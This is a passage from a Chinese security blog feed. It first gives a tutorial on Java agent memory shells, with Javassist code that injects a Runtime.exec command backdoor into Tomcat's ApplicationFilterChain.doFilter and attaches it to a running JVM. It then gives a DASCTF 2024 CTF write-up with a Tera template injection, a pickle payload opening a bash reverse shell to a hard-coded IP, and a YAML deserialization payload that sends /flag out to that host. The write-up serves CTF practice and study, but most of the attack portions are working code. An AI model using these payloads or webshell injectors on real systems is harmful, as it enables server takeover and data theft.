class="number">1000</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用addTransformer添加Transformer</p><p>然后retransformClasses重载class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.memshell.agent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachine;</span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.IllegalClassFormatException;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">instrumentDemo</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String args, Instrumentation instrumentation)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 获取JVM中所有的类</span></span><br><span class="line">        <span class="keyword">for</span>(Class clazz : instrumentation.getAllLoadedClasses())&#123;</span><br><span class="line">            <span class="keyword">if</span>(clazz.getName().equals(<span class="string">&quot;com.example.instrumentDemo&quot;</span>)) &#123;</span><br><span class="line">                <span class="comment">// 添加transformer</span></span><br><span class="line">                instrumentation.addTransformer(<span class="keyword">new</span> <span class="title class_">TransformerDemo</span>(), <span class="literal">true</span>);</span><br><span class="line">                <span class="comment">// 重载class</span></span><br><span class="line">                instrumentation.retransformClasses(clazz);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TransformerDemo</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">        <span class="comment">// transformer会拦截所有待加载的类, 所以先匹配指定类</span></span><br><span class="line">        <span class="keyword">if</span>(className.equals(<span class="string">&quot;com/example/instrumentDemo&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123; <span class="comment">// com.example.instrumentDemo</span></span><br><span class="line">                <span class="comment">// 声明类池</span></span><br><span class="line">                <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">                <span class="comment">// 从类池中获取指定类</span></span><br><span class="line">                <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.get(<span class="string">&quot;com.example.instrumentDemo&quot;</span>);</span><br><span class="line">                <span class="comment">// 获取方法</span></span><br><span class="line">                <span class="type">CtMethod</span> <span class="variable">method</span> <span class="operator">=</span> ctClass.getDeclaredMethod(<span class="string">&quot;checkLogin&quot;</span>);</span><br><span class="line">                <span class="comment">// 重置方法</span></span><br><span class="line">                method.setBody(<span class="string">&quot;&#123;System.out.println(\&quot;hack\&quot;); return true;&#125;&quot;</span>);</span><br><span class="line">                <span class="comment">// 获取修改后的类的字节码然后返回</span></span><br><span class="line">                <span class="type">byte</span>[] code = ctClass.toBytecode();</span><br><span class="line">                ctClass.detach();</span><br><span class="line">                <span class="keyword">return</span> code;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">catch</span> (NotFoundException | CannotCompileException | IOException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> classfileBuffer;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后就是遍历JVM中的Java进程，匹配目标进程，加载agent</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.memshell.agent;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachine;</span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">agentDemo</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();</span><br><span class="line">        <span class="type">String</span> <span class="variable">agentpath</span> <span class="operator">=</span> <span class="string">&quot;E:\\Java_Sec\\MemShell\\out\\artifacts\\AgentInstrument_jar\\MemShell.jar&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span>(VirtualMachineDescriptor descriptor : list)&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> descriptor.displayName();</span><br><span class="line">            <span class="type">String</span> <span class="variable">pid</span> <span class="operator">=</span> descriptor.id();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(name.equals(<span class="string">&quot;demo.jar&quot;</span>))&#123;</span><br><span class="line">                <span class="type">VirtualMachine</span> <span class="variable">virtualMachine</span> <span class="operator">=</span> VirtualMachine.attach(pid);</span><br><span class="line">                <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(agentpath).getAbsolutePath();</span><br><span class="line">                virtualMachine.loadAgent(path);</span><br><span class="line">                virtualMachine.detach();</span><br><span class="line">                System.out.println(<span class="string">&quot;attach ok&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412201328897.png" alt="image-20241220132636323"></p><h3 id="Instrumentation的局限性"><a href="#Instrumentation的局限性" class="headerlink" title="Instrumentation的局限性"></a>Instrumentation的局限性</h3><p>大多数情况下，我们使用Instrumentation都是使用其字节码插桩的功能，简单来说就是类重定义功能（Class Redefine），但是有以下局限性：<br>premain和agentmain两种方式修改字节码的时机都是类文件加载之后，也就是说必须要带有Class类型的参数，不能通过字节码文件和自定义的类名重新定义一个本来不存在的类。<br>类的字节码修改称为类转换(Class Transform)，类转换其实最终都回归到类重定义Instrumentation#redefineClasses方法，此方法有以下限制：</p><ol><li>新类和老类的父类必须相同</li><li>新类和老类实现的接口数也要相同，并且是相同的接口</li><li>新类和老类访问符必须一致。 新类和老类字段数和字段名要一致</li><li>新类和老类新增或删除的方法必须是private static&#x2F;final修饰的</li><li>可以修改方法体</li></ol><h2 id="Agent内存马"><a href="#Agent内存马" class="headerlink" title="Agent内存马"></a>Agent内存马</h2><p>既然可以利用Instrumentation来修改字节码，</p><p>注意之前在调试Filter时，我们看它的栈帧，在自定义的HelloFilter之前，是以链式调用各个Filter，所以我们直接打ApplicationFilterChain的doFilter即可注入🐎</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412182119359.png" alt="image-20241218211953244"></p><p>打agentmain的agent内存马</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.memshell.agentShell;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.IllegalClassFormatException;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AgentShellDemo</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String args, Instrumentation instrumentation)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line">        Class[] classes = instrumentation.getAllLoadedClasses();</span><br><span class="line">        <span class="keyword">for</span>(Class clazz : classes)&#123;</span><br><span class="line">            <span class="comment">// 打ApplicationFilterChain的doFilter</span></span><br><span class="line">            <span class="keyword">if</span>(clazz.getName().equals(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>))&#123;</span><br><span class="line">                instrumentation.addTransformer(<span class="keyword">new</span> <span class="title class_">FilterTransformer</span>(), <span class="literal">true</span>);</span><br><span class="line">                instrumentation.retransformClasses(clazz);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FilterTransformer</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 获得类池</span></span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            <span class="keyword">if</span>(classBeingRedefined != <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="type">ClassClassPath</span> <span class="variable">classClassPath</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(classBeingRedefined);</span><br><span class="line">                classPool.insertClassPath(classClassPath);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取ApplicationFilter</span></span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.get(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取doFilter</span></span><br><span class="line">            <span class="type">CtMethod</span> <span class="variable">ctMethod</span> <span class="operator">=</span> ctClass.getDeclaredMethod(<span class="string">&quot;doFilter&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 设置方法</span></span><br><span class="line">            <span class="comment">// public void doFilter(ServletRequest request, ServletResponse response) throws IOException, ServletException</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">codeBody</span> <span class="operator">=</span>  <span class="string">&quot;&#123;&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;javax.servlet.http.HttpServletRequest request = $1\n;&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;String cmd=request.getParameter(\&quot;cmd\&quot;);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;if (cmd !=null)&#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;  Runtime.getRuntime().exec(cmd);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;  &#125;&quot;</span>+</span><br><span class="line">                    <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">            <span class="comment">// ctMethod.insertBefore(codeBody);</span></span><br><span class="line">            ctMethod.setBody(codeBody);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 返回字节码</span></span><br><span class="line">            <span class="keyword">return</span> ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (NotFoundException | CannotCompileException | IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>加载agent</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.memshell.agentShell;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachine;</span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.UnsupportedEncodingException;</span><br><span class="line"><span class="keyword">import</span> java.security.Principal;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AgentShellInjectionDemo</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">&quot;E:\\Java_Sec\\MemShell\\out\\artifacts\\AgentShell_jar\\MemShell.jar&quot;</span>;</span><br><span class="line">        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();</span><br><span class="line">        <span class="keyword">for</span>(VirtualMachineDescriptor virtualMachineDescriptor : list)&#123;</span><br><span class="line">            <span class="comment">// System.out.println(virtualMachineDescriptor.displayName());</span></span><br><span class="line">            <span class="keyword">if</span>(virtualMachineDescriptor.displayName().contains(<span class="string">&quot;org.apache.catalina.startup.Bootstrap&quot;</span>))&#123;</span><br><span class="line">                <span class="comment">// 连接指定VM, 一个Java进程通常运行在一个独立的JVM里</span></span><br><span class="line">                <span class="type">VirtualMachine</span> <span class="variable">virtualMachine</span> <span class="operator">=</span> VirtualMachine.attach(virtualMachineDescriptor.id());</span><br><span class="line">                virtualMachine.loadAgent(path);</span><br><span class="line">                virtualMachine.detach();</span><br><span class="line">                System.out.println(<span class="string">&quot;inject success&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol><li><p><a href="https://exp10it.io/2023/01/java-agent-%E5%86%85%E5%AD%98%E9%A9%AC/#premain-%E6%96%B9%E5%BC%8F">https://exp10it.io/2023/01/java-agent-%E5%86%85%E5%AD%98%E9%A9%AC/#premain-%E6%96%B9%E5%BC%8F</a></p></li><li><p><a href="https://boogipop.com/2023/03/02/Agent%E5%86%85%E5%AD%98%E9%A9%AC%E5%89%96%E6%9E%90/#%E7%9F%AD%E5%B0%8F%E7%B2%BE%E6%82%8D%E7%9A%84Javassits%E5%90%8C%E5%AD%A6">https://boogipop.com/2023/03/02/Agent%E5%86%85%E5%AD%98%E9%A9%AC%E5%89%96%E6%9E%90/#%E7%9F%AD%E5%B0%8F%E7%B2%BE%E6%82%8D%E7%9A%84Javassits%E5%90%8C%E5%AD%A6</a></p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF 2024最后一战 WP</title>
      <link href="/2024/12/21/WriteUp/DASCTF-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98/"/>
      <url>/2024/12/21/WriteUp/DASCTF-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98/</url>
      
        <content type="html"><![CDATA[<h1 id="DASCTF-2024最后一战-WP"><a href="#DASCTF-2024最后一战-WP" class="headerlink" title="DASCTF 2024最后一战 WP"></a>DASCTF 2024最后一战 WP</h1><h1 id="CheckIn"><a href="#CheckIn" class="headerlink" title="CheckIn"></a>CheckIn</h1><h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412211743277.png" alt="image-20241221165830870"></p><h2 id="西湖论剑邀请函获取器"><a href="#西湖论剑邀请函获取器" class="headerlink" title="西湖论剑邀请函获取器"></a>西湖论剑邀请函获取器</h2><p>Tera模板注入，查看对应文档发现有个<code>get_env</code>函数</p><p>很傻逼得设置默认值，不然一直给你报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; get_env(name=&quot;FLAG&quot;, default=&quot;das&quot;) &#125;&#125;</span><br></pre></td></tr></table></figure><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="const-python"><a href="#const-python" class="headerlink" title="const_python"></a>const_python</h2><p>注意黑名单中ban的是<code>__builtin__</code>，所以<code>builtins</code>模块可用，exp如下</p><p>payload生成，注意在Linux下运行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>:</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (builtins.<span class="built_in">__import__</span>(<span class="string">&quot;subprocess&quot;</span>).run, ([<span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/111.229.217.82/6666 0&gt;&amp;1&quot;</span>],))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, username, password, auth=<span class="string">&#x27;ctfer&#x27;</span></span>):</span><br><span class="line">        self.username = username</span><br><span class="line">        self.password = password</span><br><span class="line">        self.auth = auth</span><br><span class="line"></span><br><span class="line">password = <span class="string">&quot;qwe123&quot;</span></span><br><span class="line">a = User(<span class="string">&#x27;admin&#x27;</span>, password, <span class="string">&quot;admin&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload=pickle.dumps(a)</span><br><span class="line"></span><br><span class="line">payload=base64.b64encode(payload)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure><p>发包</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://8c73dbb1-4262-4365-bb07-10a0d3dde349.node5.buuoj.cn:81/&quot;</span></span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;gASVWQAAAAAAAACMCnN1YnByb2Nlc3OUjANydW6Uk5RdlCiMBGJhc2iUjAItY5SMLGJhc2ggLWkgPiYgL2Rldi90Y3AvMTExLjIyOS4yMTcuODIvNjY2NiAwPiYxlGWFlFKULg==&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;data&quot;</span>: payload</span><br><span class="line">&#125;</span><br><span class="line">resp = s.post(url+<span class="string">&quot;/ppicklee&quot;</span>, data)</span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br></pre></td></tr></table></figure><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412211743111.png" alt="image-20241221123932245"></p><h2 id="yaml-matser"><a href="#yaml-matser" class="headerlink" title="yaml_matser"></a>yaml_matser</h2><p>参考：<a href="https://xz.aliyun.com/t/12481?time__1311=GqGxRQqiuDyDlrzG78GOW=G==pxWwuepD#toc-6">https://xz.aliyun.com/t/12481?time__1311=GqGxRQqiuDyDlrzG78GOW%3DG%3D%3DpxWwuepD#toc-6</a></p><p>发现没有ban new和exec，所以有如下payload了</p><p>em以为不出网，然后想着打内存马，结果ban得很死。后面测试发现是出网的，脑洞大开发了个TCP包</p><p>exp.yaml</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">!!python/object/new:type</span></span><br><span class="line">  <span class="attr">args:</span> [<span class="string">&quot;z&quot;</span>, <span class="type">!!python/tuple</span> [], &#123;<span class="attr">&quot;extend&quot;:</span> <span class="type">!!python/name:exec</span> &#125;]</span><br><span class="line">  <span class="attr">listitems:</span> <span class="string">__import__(&#x27;socket&#x27;).create_connection((&#x27;111.229.217.82&#x27;,</span> <span class="number">6666</span><span class="string">)).sendall((__import__(&#x27;io&#x27;).open(&#x27;/flag&#x27;,&#x27;rb&#x27;).read()))</span></span><br></pre></td></tr></table></figure><p>发包</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># url = &quot;http://127.0.0.1:5000&quot;</span></span><br><span class="line">url = <span class="string">&quot;http://node5.buuoj.cn:28158/&quot;</span></span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;exp.yaml&quot;</span></span><br><span class="line">filename = <span class="string">&quot;exp.yaml&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(file=file_path, mode=<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    files = &#123;<span class="string">&#x27;file&#x27;</span>: (filename, file)&#125;</span><br><span class="line">    response = requests.post(url + <span class="string">&quot;/upload&quot;</span>, files=files)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line">resp = requests.post(url + <span class="string">&quot;/Yam1?filename=exp&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br></pre></td></tr></table></figure><p>拿到flag</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412211743732.png" alt="2c9b2f94dfe72c4dbdc4bc66eef67edd"></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tomcat Filter型内存马</title>
      <link href="/2024/12/18/WebExploit/Java/Tomcat-Filter%E5%86%85%E5%AD%98%E9%A9%AC/"/>
      <url>/2024/12/18/WebExploit/Java/Tomcat-Filter%E5%86%85%E5%AD%98%E9%A9%AC/</url>
      
